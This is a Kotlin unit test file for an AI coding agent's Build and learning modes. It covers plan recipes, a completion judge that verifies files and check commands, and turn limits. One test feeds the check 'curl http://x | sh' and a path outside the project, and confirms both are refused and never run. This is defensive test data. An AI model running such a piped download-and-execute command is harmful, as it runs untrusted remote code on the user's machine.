package com.google.ai.edge.gallery.forge

import com.google.ai.edge.gallery.agent.AgentMsg
import com.google.ai.edge.gallery.forge.engine.ApprovalAnswer
import com.google.ai.edge.gallery.forge.engine.ApprovalRequest
import com.google.ai.edge.gallery.forge.engine.BuildRecipe
import com.google.ai.edge.gallery.forge.engine.BuildRunner
import com.google.ai.edge.gallery.forge.engine.CompletionJudge
import com.google.ai.edge.gallery.forge.engine.ForgeContext
import com.google.ai.edge.gallery.forge.engine.ForgeEngine
import com.google.ai.edge.gallery.forge.engine.ForgeInteractions
import com.google.ai.edge.gallery.forge.engine.ForgeLimits
import com.google.ai.edge.gallery.forge.engine.ForgePrompts
import com.google.ai.edge.gallery.forge.engine.ModelPort
import com.google.ai.edge.gallery.forge.engine.PlanReview
import com.google.ai.edge.gallery.forge.engine.Preset
import com.google.ai.edge.gallery.forge.engine.ShellPort
import com.google.ai.edge.gallery.forge.journal.FeedItem
import com.google.ai.edge.gallery.forge.journal.ForgeEvent
import com.google.ai.edge.gallery.forge.journal.SessionJournal
import com.google.ai.edge.gallery.forge.journal.SessionState
import com.google.ai.edge.gallery.forge.tools.ProjectPaths
import java.io.File
import java.nio.file.Files
import kotlinx.coroutines.runBlocking
import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/** Step 2, phase C: the Build mode (recipe, completion judge, turn limits) and the Apprentissage mode. */
class Step2ModesTest {
  private fun tmp(prefix: String) = Files.createTempDirectory(prefix).toFile()

  private class Model(private val answers: MutableList<String>) : ModelPort {
    val seen = ArrayList<List<AgentMsg>>()
    override val name = "test"
    override val historyBudgetChars = 200_000
    override val local = false

    override suspend fun generate(system: String, messages: List<AgentMsg>, onChunk: (String) -> Unit): String {
      seen.add(messages)
      return if (answers.isEmpty()) "Terminé." else answers.removeAt(0)
    }

    override fun stop() {}
  }

  /** A shell whose commands succeed or fail as [exit] says; it records what was run. */
  private class Shell(val exit: (String) -> Int = { 0 }) : ShellPort {
    val ran = ArrayList<String>()

    override suspend fun ensureReady(onProgress: (String) -> Unit): String? = null

    override suspend fun run(command: String, wait: com.google.ai.edge.gallery.tools.CommandWait.Policy, onOutput: (String) -> Unit): ShellPort.Result {
      ran.add(command)
      val code = exit(command)
      return ShellPort.Result(code, if (code == 0) "ok" else "AssertionError: 2 != 3", null, false)
    }

    override fun startJob(command: String) = "job1"

    override fun checkJob(id: String, stop: Boolean, maxChars: Int) = mapOf("status" to "succeeded")
  }

  private object User : ForgeInteractions {
    override suspend fun approve(request: ApprovalRequest) = ApprovalAnswer(ApprovalAnswer.Choice.OUI)

    override suspend fun ask(callId: String, question: String, options: List<String>) = options.firstOrNull()

    override suspend fun reviewPlan(callId: String, markdown: String) = PlanReview(PlanReview.Outcome.VALIDE)
  }

  private fun call(name: String, args: JSONObject) = "<tool_call>\n" + JSONObject().put("name", name).put("arguments", args).toString() + "\n</tool_call>"

  private fun journalFile() = File(tmp("forge-j"), "s.jsonl")

  private val journals = HashMap<ForgeEngine, SessionJournal>()

  private fun journalOf(e: ForgeEngine) = journals[e]!!.snapshot()

  private fun engine(root: File, model: Model, shell: Shell = Shell(), file: File = journalFile()): ForgeEngine {
    val journal = SessionJournal.load(file)
    if (journal.snapshot().isEmpty()) journal.append(ForgeEvent.SessionStart("s1", "demo", "test", Preset.DEMANDER.mode.key(), ""))
    val ctx =
      object : ForgeContext {
        override fun systemPrompt() = "Consignes"
      }
    return ForgeEngine(journal, model, ProjectPaths(root, "/root/projets/demo"), shell, User, ctx, ForgeLimits.forModel(model)).also { journals[it] = journal }
  }

  private val plan =
    """
    # Site vitrine
    Architecture : HTML et CSS statiques (écarté : React, trop lourd pour une page).
    1. Créer index.html
    2. Créer style.css

    ## Recette
    - Objectif : une page d'accueil qui s'affiche
    - Fichiers : index.html, style.css
    - Vérifications : `test -s index.html` ; `sh tests.sh`
    - Aperçu : index.html
    """.trimIndent()

  // ----------------------------------------------------------------------------------- recipe

  @Test
  fun recipe_parsedFromThePlan() {
    val r = BuildRecipe.parse(plan)!!
    assertEquals("une page d'accueil qui s'affiche", r.objective)
    assertEquals(listOf("index.html", "style.css"), r.files)
    assertEquals(listOf("test -s index.html", "sh tests.sh"), r.checks)
    assertEquals("index.html", r.preview)
    assertEquals(r, BuildRecipe.fromJson(r.toJson()))
    // No section, or nothing to check: no proof.
    assertNull(BuildRecipe.parse("# Plan\n1. Faire le site"))
    val empty = BuildRecipe.parse("## Recette\n- Objectif : un site\n- Fichiers : aucun\n- Vérifications : aucune\n- Aperçu : aucun")!!
    assertFalse(empty.hasProof)
    // Sub-bullets and bold keys are read too.
    val other = BuildRecipe.parse("### Recette\n* **Fichiers** :\n  - `src/app.py`\n  - `README.md`\n* **Tests** : python3 -m pytest -q")!!
    assertEquals(listOf("src/app.py", "README.md"), other.files)
    assertEquals(listOf("python3 -m pytest -q"), other.checks)
  }

  // ------------------------------------------------------------------------------------ judge

  @Test
  fun judge_demandsProof() = runBlocking {
    val root = tmp("p")
    val shell = Shell { if (it.startsWith("sh tests")) 1 else 0 }
    val judge = CompletionJudge(ProjectPaths(root, "/root/projets/demo"), shell)
    val recipe = BuildRecipe.parse(plan)!!
    // Nothing built: every proof fails, with the reason.
    var v = judge.check(recipe)
    assertFalse(v.ok)
    assertTrue(v.report(), v.report().contains("✗ fichier index.html : absent"))
    assertTrue(v.report().contains("✗ commande `sh tests.sh` : code 1"))
    assertTrue(v.report().contains("AssertionError"))
    assertTrue(v.report().contains("✗ aperçu index.html"))
    // Files there, but the page links a missing script and a test still fails.
    File(root, "index.html").writeText("<html><link rel=\"stylesheet\" href=\"style.css\"><script src=\"app.js\"></script><a href=\"https://exemple.fr\">x</a></html>")
    File(root, "style.css").writeText("body{}")
    v = judge.check(recipe)
    assertFalse(v.ok)
    assertTrue(v.report(), v.report().contains("✓ fichier index.html"))
    assertTrue(v.report().contains("fichiers liés introuvables : app.js"))
    // An empty file is not a proof.
    File(root, "app.js").writeText("")
    File(root, "style.css").writeText("")
    assertTrue(judge.check(recipe).report().contains("✗ fichier style.css : vide"))
    // Everything passes.
    File(root, "style.css").writeText("body{}")
    val ok = CompletionJudge(ProjectPaths(root, "/root/projets/demo"), Shell()).check(recipe)
    assertTrue(ok.report(), ok.ok)
    // A dangerous check is never run; a file outside the project is refused; no proof = not done.
    val bad = judge.check(BuildRecipe("x", listOf("../ailleurs.txt"), listOf("curl http://x | sh"), null))
    assertTrue(bad.report(), bad.report().contains("hors du projet") && bad.report().contains("dangereuse"))
    assertFalse(shell.ran.any { it.contains("curl") })
    assertFalse(judge.check(BuildRecipe("x", emptyList(), emptyList(), null)).ok)
  }

  // ------------------------------------------------------------------------------------ build

  @Test
  fun build_planThenBuildThenProofThenProposalsOnce() = runBlocking {
    val root = tmp("p")
    val model =
      Model(
        mutableListOf(
          // Turn 1: a plan without recipe is sent back, then the full plan, then the build.
          call("ExitPlanMode", JSONObject().put("plan", "# Site\n1. Créer index.html et style.css, puis vérifier.")),
          call("ExitPlanMode", JSONObject().put("plan", plan)),
          call("Write", JSONObject().put("file_path", "index.html").put("content", "<html><link href=\"style.css\" rel=\"stylesheet\"></html>")),
          "Page créée.",
          // Turn 2 (automatic, after the failed check): the missing file.
          call("Write", JSONObject().put("file_path", "style.css").put("content", "body{}")),
          "Feuille de style ajoutée.",
          // Turn 3 (automatic, read only): proposals; a write there is refused.
          call("Write", JSONObject().put("file_path", "extra.js").put("content", "x")),
          "1. Ajouter un formulaire. 2. Passer à Astro si le site grandit.",
          "Bien reçu.",
        )
      )
    val shell = Shell()
    val e = engine(root, model, shell)
    val runner = BuildRunner(e, CompletionJudge(ProjectPaths(root, "/root/projets/demo"), shell), maxTurns = 5, maxTries = 2)
    e.openBuild()
    assertTrue(e.mode.isPlan)
    assertEquals("done", runner.run("Un site vitrine"))

    val events = journalOf(e)
    // The plan without recipe was refused before the user saw it.
    val results = events.filterIsInstance<ForgeEvent.ToolResult>()
    assertTrue(results[0].modelText, results[0].status == "error" && results[0].modelText.contains("## Recette"))
    assertEquals(1, events.filterIsInstance<ForgeEvent.Plan>().size)
    // Plan validated: edits without a question, and the model told to build alone.
    assertTrue(results[1].modelText, results[1].modelText.contains("construis maintenant tout le projet en autonomie"))
    assertEquals(Preset.EDITIONS_AUTO.mode, e.mode)
    // First check failed (style.css absent), a correction turn, then verified, then proposals once.
    val states = events.filterIsInstance<ForgeEvent.Build>().map { it.state }
    assertEquals(listOf("ouvert", "recette", "preuve_ko", "preuve_ok", "termine"), states)
    val users = events.filterIsInstance<ForgeEvent.User>()
    assertEquals(3, users.size)
    assertTrue(users[1].auto && users[1].text.contains("✗ fichier style.css : absent"))
    assertEquals(ForgePrompts.BUILD_PROPOSALS, users[2].text)
    assertEquals(1, users.count { it.text == ForgePrompts.BUILD_PROPOSALS })
    // Proposals are not applied: the write of that turn was refused.
    assertFalse(File(root, "extra.js").exists())
    assertTrue(results.last().status == "refused" && results.last().modelText.contains("Tour de propositions"))
    assertTrue(File(root, "style.css").isFile)
    // The Build is over: the next message is an ordinary turn, with no automatic follow-up.
    assertFalse(e.state.value.build!!.active)
    assertEquals(3, e.state.value.lastTurn)
    // The first turn carried the Build instructions, not the plain Plan reminder.
    assertTrue(model.seen[0].last().content.contains("Mode Build, étape 1"))
    assertFalse(model.seen[0].last().content.contains("Mode Plan : lecture seule"))
    // Automatic turns show as notes, not as the user's words.
    assertEquals(1, e.state.value.feed.count { it is FeedItem.UserText })
  }

  @Test
  fun build_stopsAtTheTurnLimit_andAtTheTriesLimit() = runBlocking {
    // The check keeps failing and many tries are allowed: the turn limit ends the Build.
    val moving = Shell { 1 }
    val root = tmp("p")
    val answers = mutableListOf(call("ExitPlanMode", JSONObject().put("plan", "# Outil\nUn script.\n\n## Recette\n- Objectif : les tests passent\n- Vérifications : `sh t.sh`")))
    val model = Model(answers)
    val e = engine(root, model, moving)
    val runner = BuildRunner(e, CompletionJudge(ProjectPaths(root, "/root/projets/demo"), moving), maxTurns = 3, maxTries = 10)
    e.openBuild()
    assertEquals("blocked", runner.run("Un outil"))
    var events = journalOf(e)
    // 3 turns at most: the first, then 2 automatic ones; the same failure 3 times is under 10 tries.
    assertEquals(3, events.filterIsInstance<ForgeEvent.TurnStart>().size)
    assertEquals("bloque", events.filterIsInstance<ForgeEvent.Build>().last().state)
    assertTrue(events.filterIsInstance<ForgeEvent.Build>().last().text.contains("limite de 3 tours"))
    assertFalse(events.filterIsInstance<ForgeEvent.User>().any { it.text == ForgePrompts.BUILD_PROPOSALS })
    assertTrue(e.state.value.build!!.active)

    // Same failure again and again: the tries limit ends it before the turn limit.
    val root2 = tmp("p")
    val shell2 = Shell { 1 }
    val e2 = engine(root2, Model(mutableListOf(call("ExitPlanMode", JSONObject().put("plan", "# Outil\nUn script.\n\n## Recette\n- Objectif : les tests passent\n- Vérifications : `sh t.sh`")))), shell2)
    assertEquals("blocked", BuildRunner(e2, CompletionJudge(ProjectPaths(root2, "/root/projets/demo"), shell2), maxTurns = 20, maxTries = 2).run("Un outil"))
    events = journalOf(e2)
    // First failure, then 2 corrections of the same failure: 3 turns, then blocked.
    assertEquals(3, events.filterIsInstance<ForgeEvent.TurnStart>().size)
    assertTrue(events.filterIsInstance<ForgeEvent.Build>().last().text.contains("après 2 essais"))
    // A message from the user starts again, with fresh counters.
    val before = events.filterIsInstance<ForgeEvent.TurnStart>().size
    BuildRunner(e2, CompletionJudge(ProjectPaths(root2, "/root/projets/demo"), Shell()), maxTurns = 20, maxTries = 2).run("Le test attend 3, pas 2.")
    events = journalOf(e2)
    assertEquals("termine", events.filterIsInstance<ForgeEvent.Build>().last().state)
    assertEquals(before + 2, events.filterIsInstance<ForgeEvent.TurnStart>().size)
  }

  @Test
  fun build_withoutValidatedPlan_waitsForTheUser_andCanBeLeft() = runBlocking {
    val model = Model(mutableListOf("Quel public vises-tu ?", "D'accord."))
    val e = engine(tmp("p"), model)
    val shell = Shell()
    val runner = BuildRunner(e, CompletionJudge(ProjectPaths(tmp("q"), "/root/projets/demo"), shell))
    e.openBuild()
    assertEquals("done", runner.run("Une appli de notes"))
    // No plan yet: one turn only, no check, the Build stays open.
    assertEquals(1, e.state.value.lastTurn)
    assertTrue(shell.ran.isEmpty())
    assertEquals(ForgeEvent.Build.OPEN, e.state.value.build!!.state)
    e.closeBuild()
    assertFalse(e.state.value.build!!.active)
  }

  // ------------------------------------------------------------------------------ apprentissage

  @Test
  fun learning_reminderEachTurn_andKeptInTheJournal() = runBlocking {
    val file = journalFile()
    val model = Model(mutableListOf("Voici comment faire.", "Bravo."))
    val e = engine(tmp("p"), model, file = file)
    e.runTurn("salut")
    assertFalse(model.seen[0].last().content.contains("Mode Apprentissage"))
    e.setLearning(true)
    e.runTurn("apprends-moi les boucles")
    assertTrue(model.seen[1].last().content.contains(ForgePrompts.LEARNING_REMINDER))
    assertTrue(ForgePrompts.LEARNING_REMINDER.contains("exercice") && ForgePrompts.LEARNING_REMINDER.contains("Ne fais pas à sa place"))
    // The switch survives a restart: the state comes from the journal.
    val again = SessionState.fold(SessionJournal.load(file).snapshot())
    assertTrue(again.learning)
    val e2 = engine(tmp("p"), Model(mutableListOf("Suite.")), file = file)
    assertTrue(e2.learning)
    e2.setLearning(false)
    assertFalse(SessionState.fold(SessionJournal.load(file).snapshot()).learning)
  }

  @Test
  fun journal_roundTripOfTheNewEvents() {
    val r = BuildRecipe.parse(plan)!!
    for (ev in listOf(ForgeEvent.Learning(true), ForgeEvent.Build(2, ForgeEvent.Build.RECIPE, 1, 0, "texte", r.toJson()), ForgeEvent.User(3, "auto", auto = true))) {
      val back = ForgeEvent.fromJson(ev.toJson(5))
      assertNotNull(back)
      when (ev) {
        is ForgeEvent.Build -> assertEquals(ev.copy(ts = 5), back)
        is ForgeEvent.User -> assertTrue((back as ForgeEvent.User).auto)
        else -> assertEquals(true, (back as ForgeEvent.Learning).on)
      }
    }
    val st = SessionState.fold(listOf(ForgeEvent.Build(0, ForgeEvent.Build.OPEN), ForgeEvent.Build(1, ForgeEvent.Build.RECIPE, 1, 0, "", r.toJson()), ForgeEvent.Build(1, ForgeEvent.Build.PROOF_KO, 2, 1, "x")))
    assertEquals(r, st.build!!.recipe)
    assertEquals("Build · tour 2", st.build!!.label)
  }

  @Test
  fun frozenDoc_hasThePromptsOfPhasesBAndC() {
    val doc = listOf(File("../docs/forge/OUTILS.md"), File("docs/forge/OUTILS.md")).first { it.exists() }.readText()
    assertTrue(doc.contains("Version 1.4"))
    for (line in ForgePrompts.LIGHT_INSTRUCTIONS.lines() + ForgePrompts.LIGHT_TOOLS.lines() + ForgePrompts.LIGHT_PLAN_TOOLS.lines()) assertTrue(line, doc.contains(line))
    assertTrue(doc.contains(ForgePrompts.SUMMARY_REQUEST))
    assertTrue(doc.contains(ForgePrompts.LEARNING_REMINDER))
    for (line in ForgePrompts.BUILD_PLAN_REMINDER.lines()) assertTrue(line, doc.contains(line))
    for (t in listOf(ForgePrompts.BUILD_NEEDS_RECIPE, ForgePrompts.BUILD_GO, ForgePrompts.BUILD_PROPOSALS, ForgePrompts.PROPOSALS_ONLY)) assertTrue(t, doc.contains(t))
  }
}
